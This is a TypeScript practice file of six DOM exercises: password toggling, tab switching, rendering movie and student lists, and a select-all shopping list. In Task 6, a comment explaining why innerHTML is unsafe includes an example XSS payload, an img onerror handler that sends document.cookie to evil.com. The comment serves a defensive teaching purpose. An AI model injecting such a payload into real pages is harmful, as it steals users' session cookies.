console.log("script.ts loaded");

// ===== Task 1: Show and hide password =====
const pwdInput = document.querySelector("#password") as HTMLInputElement;
const btn1 = document.querySelector("#btn1") as HTMLButtonElement;

btn1.addEventListener("click", () => {
  pwdInput.type = pwdInput.type === "text" ? "password" : "text";
});

// ===== Task 2: Get input value =====
const input1 = document.querySelector("#input1") as HTMLInputElement;
const btn2 = document.querySelector("#btn2") as HTMLButtonElement;
const result = document.querySelector("#result") as HTMLDivElement;

btn2.addEventListener("click", () => {
  result.innerText = input1.value;
});

// ===== Task 3: Click to switch tab style =====
const li1 = document.querySelector("#list li:nth-child(1)") as HTMLLIElement;
const li2 = document.querySelector("#list li:nth-child(2)") as HTMLLIElement;

li1.addEventListener("click", () => {
  li1.classList.add("active");
  li2.classList.remove("active");
});
li2.addEventListener("click", () => {
  li2.classList.add("active");
  li1.classList.remove("active");
});

// ===== Task 4: Render movie list =====
interface Film {
  url: string;
  title: string;
  grade: number;
}

const filmList: Film[] = [
  {
    url: "https://media.themoviedb.org/t/p/w220_and_h330_face/cgsK4fUP1CwzTOMWhtU6B3n6hpO.jpg",
    title: "Transforming Mech: Mechanical Beast",
    grade: 7.8,
  },
  {
    url: "https://media.themoviedb.org/t/p/w220_and_h330_face/s8Ab1FJ824KVBHC5bZ6kDS9hIkq.jpg",
    title: "Dirty Angels",
    grade: 7.2,
  },
  {
    url: "https://media.themoviedb.org/t/p/w220_and_h330_face/ouJWDKwqtPj8gzeJoO7mHJ53AxZ.jpg",
    title: "Gladiator",
    grade: 7.5,
  },
];

// Clear button
const btn3 = document.querySelector("#btn3") as HTMLButtonElement;
btn3.addEventListener("click", () => {
  result.innerHTML = "";
});

const btn4 = document.querySelector("#btn4") as HTMLButtonElement;
btn4.addEventListener("click", () => {
  result.innerHTML = filmList
    .map(
      (item) => `
        <div>
            <img src="${item.url}" alt="${item.title}">
            <h3>${item.title}</h3>
            <p>Rating: ${item.grade}</p>
        </div>
    `,
    )
    .join("");
});

// ===== Task 5: Shopping list (Select all + Submit) =====
const all = document.querySelector("#all") as HTMLInputElement;
const slInput = document.querySelectorAll("#shopping-list li input") as NodeListOf<HTMLInputElement>;

// NodeList is an array-like object: it has forEach but not map/filter/every.
// Convert it to a real array first with Array.from().

// Select-all checkbox: sync all child checkboxes on click
all.addEventListener("click", () => {
  slInput.forEach((item) => {
    item.checked = all.checked;
  });
});

// Each child checkbox: sync the select-all checkbox when all are checked
slInput.forEach((item) => {
  item.addEventListener("click", () => {
    all.checked = Array.from(slInput).every((cb) => cb.checked);
  });
});

// Submit button: collect selected items
const btn5 = document.querySelector("#btn5") as HTMLButtonElement;
btn5.addEventListener("click", () => {
  const selected = Array.from(slInput)
    .filter((item) => item.checked)
    .map((item) => item.value);

  alert(selected.length > 0 ? "Selected products: " + selected.join(" ") : "No products selected");
});

// ===== Task 6: Render and delete student list =====

interface Student {
  id: number;
  name: string;
}

let students: Student[] = [
  { id: 1, name: "Tom" },
  { id: 2, name: "Jack" },
  { id: 3, name: "Mike" },
  { id: 4, name: "John" },
  { id: 5, name: "David" },
  { id: 6, name: "Alex" },
];

// --- Approach 1: innerHTML concatenation (simple and direct, but has XSS risk) ---
// Note: with innerHTML, you need to re-query and re-bind delete button events after rendering,
// because assigning innerHTML destroys and rebuilds all DOM nodes.
// Warning: if students data comes from user input, innerHTML introduces XSS risk.
// Example attacker input: `Jack<img src="x" onerror="fetch('https://evil.com?c='+document.cookie)">`

const btn6 = document.querySelector("#btn6") as HTMLButtonElement;
btn6.addEventListener("click", () => {
  result.innerHTML = `<ul>${students
    .map(
      (item) =>
        `<li>ID: ${item.id} - Name: ${item.name} - <button class="delete-btn" data-user-id="${item.id}">Delete</button></li>`,
    )
    .join("")}</ul>`;

  // Re-bind events for all delete buttons after rendering
  document.querySelectorAll<HTMLButtonElement>(".delete-btn").forEach((btn) => {
    btn.addEventListener("click", (ev) => {
      const userId = (ev.target as HTMLButtonElement).dataset.userId!;
      students = students.filter((s) => s.id !== Number(userId));
      btn6.click(); // Re-render
    });
  });
});

// --- Approach 2: createElement (safer, events can be bound during creation) ---
function renderStudentList() {
  result.textContent = ""; // Clearing with textContent is safer (does not parse HTML)
  const ul = document.createElement("ul");

  students.forEach((student) => {
    const li = document.createElement("li");
    const info = document.createTextNode(`ID: ${student.id} - Name: ${student.name} - `);

    const deleteBtn = document.createElement("button");
    deleteBtn.textContent = "Delete";
    deleteBtn.dataset.userId = student.id.toString();
    deleteBtn.addEventListener("click", () => {
      students = students.filter((s) => s.id !== student.id);
      renderStudentList();
    });

    li.append(info, deleteBtn); // append can add multiple nodes at once
    ul.appendChild(li);
  });

  result.appendChild(ul);
}

const btn7 = document.querySelector("#btn7") as HTMLButtonElement;
btn7.addEventListener("click", renderStudentList);
